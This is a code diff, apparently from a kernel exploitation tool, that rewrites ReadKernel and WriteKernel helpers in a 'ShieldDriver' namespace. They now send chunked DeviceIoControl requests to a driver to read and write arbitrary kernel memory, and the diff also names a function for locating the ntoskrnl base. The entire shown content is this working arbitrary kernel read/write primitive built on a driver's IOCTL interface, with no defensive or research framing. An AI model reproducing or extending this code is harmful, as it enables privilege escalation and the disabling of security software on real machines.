@@ -28,30 +28,73 @@ namespace ShieldDriver {
             CloseHandle(hDevice);
     }
 
-    bool KernelMemcpy(HANDLE hDevice, uint64_t dest, uint64_t src, uint64_t size) {
-        SHIELD_REQUEST req{};
-        req.magic       = SHIELD_MAGIC;
-        req.subcode     = SHIELD_SUBCODE_MEMCPY;
-        req.destination = dest;
-        req.source      = src;
-        req.length      = size;
-
-        DWORD bytesReturned = 0;
-        return DeviceIoControl(
-            hDevice,
-            SHIELD_IOCTL_CODE,
-            &req, sizeof(req),
-            &req, sizeof(req),
-            &bytesReturned, nullptr
-        );
-    }
-
     bool ReadKernel(HANDLE hDevice, uint64_t kernelAddr, void* userBuf, uint64_t size) {
-        return KernelMemcpy(hDevice, (uint64_t)userBuf, kernelAddr, size);
+        uint8_t* outPtr = (uint8_t*)userBuf;
+        uint64_t currAddr = kernelAddr;
+        uint64_t remaining = size;
+
+        while (remaining > 0) {
+            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;
+
+            SHIELD_REQUEST req{};
+            req.magic = SHIELD_MAGIC;
+            req.subcode = SHIELD_SUBCODE_MEMCPY;
+            req.direction = 1; // Read from kernel
+            req.size = chunkSize;
+            req.kernel_address = currAddr;
+
+            DWORD bytesReturned = 0;
+            BOOL res = DeviceIoControl(
+                hDevice,
+                SHIELD_IOCTL_CODE,
+                &req, sizeof(req),
+                &req, sizeof(req),
+                &bytesReturned, nullptr
+            );
+
+            if (!res) return false;
+
+            memcpy(outPtr, req.buffer, chunkSize);
+
+            currAddr += chunkSize;
+            outPtr += chunkSize;
+            remaining -= chunkSize;
+        }
+        return true;
     }
 
     bool WriteKernel(HANDLE hDevice, uint64_t kernelAddr, const void* userBuf, uint64_t size) {
-        return KernelMemcpy(hDevice, kernelAddr, (uint64_t)userBuf, size);
+        const uint8_t* inPtr = (const uint8_t*)userBuf;
+        uint64_t currAddr = kernelAddr;
+        uint64_t remaining = size;
+
+        while (remaining > 0) {
+            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;
+
+            SHIELD_REQUEST req{};
+            req.magic = SHIELD_MAGIC;
+            req.subcode = SHIELD_SUBCODE_MEMCPY;
+            req.direction = 0; // Write to kernel
+            req.size = chunkSize;
+            req.kernel_address = currAddr;
+            memcpy(req.buffer, inPtr, chunkSize);
+
+            DWORD bytesReturned = 0;
+            BOOL res = DeviceIoControl(
+                hDevice,
+                SHIELD_IOCTL_CODE,
+                &req, sizeof(req),
+                &req, sizeof(req),
+                &bytesReturned, nullptr
+            );
+
+            if (!res) return false;
+
+            currAddr += chunkSize;
+            inPtr += chunkSize;
+            remaining -= chunkSize;
+        }
+        return true;
     }
 
     uint64_t GetNtoskrnlBase() {
